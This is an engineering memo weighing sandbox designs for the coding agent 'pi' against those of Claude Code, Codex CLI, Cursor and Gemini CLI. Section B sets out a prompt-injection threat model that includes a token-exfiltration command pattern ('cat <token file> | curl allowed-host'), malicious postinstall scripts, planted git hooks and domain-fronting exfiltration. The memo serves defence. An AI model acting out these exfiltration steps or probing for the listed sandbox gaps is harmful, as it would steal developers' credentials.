# Sandbox approaches: is the launcher overkill?

The question: the launcher in PR #42 runs the whole of pi in a VM-backed Linux container behind a credential-injecting host proxy. Is that more than the goal needs, what do Claude Code, Codex CLI and Cursor do, and is there a simpler way to protect pi?

The goal: prompt injection or a malicious dependency run by the agent must not steal credentials or damage the host. Fixed constraints: free and open-source tooling only, no Docker Desktop, no Podman, no tokens inside the sandbox, the internal LLM gateway stays invisible to the agent, one command and `pi` just works.

Facts and sources are in [research.md](research.md). Opinions are marked as such.

## A. Comparison

| Tool | What is sandboxed | Agent token readable by a sandboxed command | Network | Filesystem | Default on | Open source | Docker |
|---|---|---|---|---|---|---|---|
| Claude Code, Bash sandbox | Shell commands only. Agent, file tools, MCP servers, hooks outside | Yes on Linux (`~/.claude/.credentials.json`, reads open). macOS Keychain: unverified, reports conflict. Opt-in `credentials` deny or mask closes it | Host proxy, domain allowlist, empty by default, prompts. No TLS inspection by default | Writes: repo and temp. Reads: whole disk unless denied. `.git/hooks`, `.git/config` write-denied | No | Runtime yes (Apache-2.0), CLI no | No |
| Claude Code, dev container | Whole agent | Yes: the token is inside the container | iptables allowlist in the container | Container mounts | No | Reference config yes | Yes |
| Codex CLI | Spawned commands | Yes unless deny-read is set (`~/.codex/auth.json`, full disk read by default). Keychain store: unverified | Off by default. Optional proxy with allowlist, MITM hooks, placeholder secrets | Writes: workspace and temp, whole `.git`, `.codex`, `.agents` read-only. Reads: whole disk | Yes | Yes (Apache-2.0) | No |
| Cursor, local | Terminal commands | Unverified. Inferred: home readable in default "System" read mode | Allowlist plus built-in package hosts (github.com, npmjs.org, ...) | Writes: workspace and temp. `.git/hooks`, `.git/config` protected. `.cursorignore` unreadable | Under Auto-review | No | No |
| Cursor, cloud | Whole agent, one VM per agent | Yes: secrets are env vars in the VM | Allowlist modes, source control always reachable | VM | n/a (cloud) | No | n/a |
| Gemini CLI | Whole CLI when on | Inferred yes: keys pass into the sandbox | Open by default, `-closed` and `-proxied` profiles | Writes: project. Reads: broad unless `strict-*` | No | Yes (Apache-2.0) | Optional |
| The PR | Whole agent and all tools | No: placeholders only, secrets in the host proxy's memory | Host proxy, allowlist, private ranges refused, TLS terminated only for rule hosts | Allow-list mounts: repo, one session dir, read-only git metadata | Yes, `pi` is the launcher | Yes | Colima (FOSS VM), or Apple `container` |

Two observations. No other tool keeps the agent's own token out of reach of its sandboxed commands by default. Codex CLI and Claude Code now ship the same placeholder-and-proxy idea as the PR, but as an opt-in feature.

## B. Threat by threat

**Prompt injection runs `cat <token file> | curl allowed-host`.**
- Claude Code: the read succeeds on Linux by default, the curl succeeds if the host is allowed. Closed only by listing the file in `sandbox.credentials`.
- Codex CLI: the read succeeds by default. The curl fails, since network is off in `workspace-write`, until the user approves network.
- Cursor: inferred the read succeeds. The curl succeeds to any default host, github.com included.
- The PR: there is no token to read. A placeholder is worthless outside the proxy. Remaining: the agent can use the proxy as a confused deputy and make authenticated calls to rule hosts while it runs. Every placeholder design has this.

**Malicious npm `postinstall`.**
- Claude Code, Codex CLI, Cursor: the script runs in the same sandbox as the command, so the same answers as above. Codex CLI also blocks the registry fetch unless network is on. Writes outside the repo are denied everywhere.
- The PR: runs inside the container. Sees the repo, the agent volume and this repo's session dir. Reaches allowlisted hosts only.
- Shared by all: the script can poison the repo itself (sources, `node_modules`, `.pi/extensions`) for the next unsandboxed run.

**Git hook planted in the repo.**
- Claude Code, `srt`, Cursor: `.git/hooks` and `.git/config` are write-denied. Codex CLI: the whole `.git` is read-only.
- The PR: hooks, config, `commondir`, `gitdir` and worktree config are read-only binds from snapshots, with layout and link checks. Tighter than the others on worktrees and submodules (inferred from their docs, which name only hooks and config).
- Shared by all: a `.gitattributes` or build script in the worktree still runs on the host later, if host config points at it.

**Exfiltration through an allowed host such as github.com.**
- Nobody prevents it. Claude Code and `srt` warn about it and about domain fronting. Codex CLI's proxy can filter by method and path through MITM hooks. Cursor keeps source control reachable in every cloud mode.
- The PR: TLS stays end to end for non-rule hosts, so it filters by name only. It names domain fronting as a known limit.
- Opinion: this is the threat that remains in every design. Only per-path rules on terminated hosts (Codex CLI's hooks) narrow it.

## C. Is the PR overkill?

Opinion, with the facts it rests on.

What the container and VM buy over a Seatbelt-style sandbox:
1. **Tokens physically absent, not read-denied.** With Seatbelt, a missed path in the deny list is a leak. With the PR, a path that is not mounted cannot leak. This matters because nobody keeps a complete list of where secrets live on a Mac (`~/.config/gh`, `~/.docker/config.json`, `~/.kube`, shell history, `.env` files of other repos).
2. **Default-deny reads.** Mounts are an allow-list. Every other local tool reads the whole disk by default.
3. **A kernel and VM boundary.** No Keychain daemon, no host Mach services, no host Unix sockets, no Apple Events. Seatbelt filters these per rule. The profiles of `srt` and Codex CLI allow `mach-lookup` to `com.apple.SecurityServer`.
4. **The agent itself is inside.** pi's extensions and stdio MCP servers are confined too. Claude Code runs MCP servers and hooks outside its sandbox.

What it costs: every toolchain must exist in the Linux image, macOS `node_modules` with native binaries break, caches go with the container, test services need sidecars, host IDE MCPs are unreachable, and the Colima VM mounts `$HOME` writable anyway. About 22k lines of source and 29k of tests, with the Apple backend and the Colima relay still unverified on real hosts.

Verdict (opinion): not overkill as a security boundary. Against the stated goal it is the only design surveyed that meets "no tokens inside the sandbox" by construction. It is out of proportion as the only mode for daily work on a Mac. The UX costs land on every session, and a developer who hits them runs `pi --no-sandbox`, which protects nothing. The strongest parts of the PR are not the container. They are the host proxy, the placeholder render of pi's config, derive and the MCP vault. Those are what the other tools are only now adding as opt-in features.

## D. A lighter alternative: pi on the host under Seatbelt

Design, concrete:
- The launcher keeps rendering placeholder `auth.json`, `models.json` and `mcp.json` into a fake agent dir under the state dir, and starts the same host proxy.
- It starts host pi with `PI_CODING_AGENT_DIR` pointing at the fake dir, `HTTPS_PROXY` at the proxy with the per-repository token, the launcher CA in `NODE_EXTRA_CA_CERTS` and `SSL_CERT_FILE`, and a scrubbed environment (no `*_TOKEN`, `*_KEY` and the like).
- pi runs under `sandbox-exec` with a generated profile (macOS), or `bwrap` with the network namespace removed (Linux):
  - **Reads:** deny `$HOME`. Re-allow the repository and its git dir, the fake agent dir, this repository's session dir, and toolchain roots (`~/.nvm`, `~/.volta`, `~/.sdkman`, `~/.cargo`, `~/.rustup`, `~/.pub-cache`, `/opt/homebrew`), listed by policy. Deny `~/.pi`, `~/.ssh`, `~/.aws`, `~/.config/gh`, `~/Library/Keychains` explicitly even if a toolchain root covers them.
  - **Writes:** the repository minus git metadata, the fake agent dir, the session dir, a private temp dir, and per-repository cache dirs (`npm_config_cache`, `PNPM_HOME`, `GRADLE_USER_HOME` pointed under the state dir, so a poisoned cache never reaches host tools).
  - **Network:** outbound only to the proxy port on localhost, plus explicit `localhost:<port>` entries for test services and IDE MCPs that the user names.
  - **Denied:** Apple Events, `lsopen`, Unix sockets (ssh-agent, the engine socket), Keychain Mach services where nothing breaks without them.

What `srt` and `sandbox-exec` can do here:
- `srt` wraps an arbitrary process and its whole tree. It expresses deny-home with re-allowed paths, write allow-lists with mandatory git and shell-rc denies, a domain allowlist and private-range refusal. It has its own placeholder masking, but on macOS only for env vars: a masked file is denied, not masked. It documents `network.httpProxyPort` for an external proxy, while one passage says custom proxies are not yet supported in the new config format. Verify before relying on it.
- It is an npm dependency, and a beta research preview. The PR has zero npm deps. Opinion: generate the profile in the launcher instead, using the `srt` and Codex CLI profiles (Apache-2.0) as references. A Seatbelt profile is about a hundred lines of rules.
- `sandbox-exec` is deprecated and still works. It has no public replacement. Claude Code, Codex CLI, Cursor and Gemini CLI all depend on it. Opinion: the risk is real but shared, and a removal would be visible long before it lands.

What of the PR is reused: `proxy/` with `secrets/` and `vault/`, `config/`, `hostpi/` (derive, MCP auth, provider hosts), `shared/`, `grants/`, the session sweep and the git layout checks from `workspace/` (they now decide deny-write rules instead of read-only binds). Roughly 12k of the 22k source lines.

What is dropped or idle in this mode: `backend/`, `container/`, `image/`, `provision/`, the relay, the read-only git binds, the agent volume and the `packages` write-back. Roughly 7k lines.

UX problems that disappear: toolchains are the host's, native `node_modules` work, caches persist, Postgres or Redis on the host is reachable by explicit port, IDE MCPs are reachable by explicit port, sessions are host pi's own files, no VM to start, no image to build.

New gaps:
- **Same kernel.** A macOS sandbox escape or a kernel bug crosses the boundary. Opinion: rarer than a misconfigured path, but the container does not have this class of gap at all.
- **Read deny-list completeness.** With deny-home and an allow-list this shrinks, but toolchain roots are wide, and `.env` files of other repos under them become readable.
- **Keychain and Mach services.** Behaviour under `srt` is contested in bug reports. Must be tested with `security find-generic-password` on a real Mac before any claim.
- **Same uid.** Seatbelt limits signals and process info to the sandbox in the reference profiles, so the proxy's memory is out of reach. On Linux, `bwrap` gives a new PID namespace. Inferred, test it.
- **Environment.** Everything the launcher does not scrub is inherited. An allow-list of env vars is safer than a deny-list.
- **Localhost holes.** On macOS, `allowLocalBinding` in `srt` opens every localhost port. Only per-port rules keep host services narrow.
- **Go tools.** They need `trustd` for TLS through a MITM proxy, which `srt` calls an exfiltration path.
- **Git.** Seatbelt denies writes by path. The worktree and submodule cases the PR handles with snapshots need the same discovery, turned into deny rules.

Size estimate (opinion): a profile generator for Seatbelt and bwrap, the env scrub and the launch glue is 2k to 4k new lines plus tests. A pivot that deletes the container path ends near 13k to 15k source lines. Adding it as a second backend keeps the 22k and adds the new code. The PR's backend interface is container-shaped (create, start, volumes), so the host mode sits beside it, not under it (inferred from folder names, not checked).

## E. Recommendation

Opinion. Keep the PR's host side and add the Seatbelt and bwrap mode as a second backend, made the default for repositories the developer trusts, with the container as the strict mode for untrusted code and policy able to force it. The reasoning a sceptical owner needs: the threat you named first, a token read and sent out, is solved by the proxy and the placeholder render, not by the container. Those work the same for a host process that cannot read the real `~/.pi`. The container adds default-deny reads by construction and a kernel boundary. Those are real and worth keeping for untrusted repositories, but they cost toolchains, native modules, caches, services and IDE MCPs on every session. A sandbox that developers turn off protects less than a weaker one they keep on. Before building, spend a day with `srt` and a hand-written profile on a real Mac: run pi, `npm test`, a JDK build and git under deny-home, and try to read the Keychain and the proxy's memory from inside. If either read works, the Seatbelt mode needs more than this design, and the container stays the only mode.
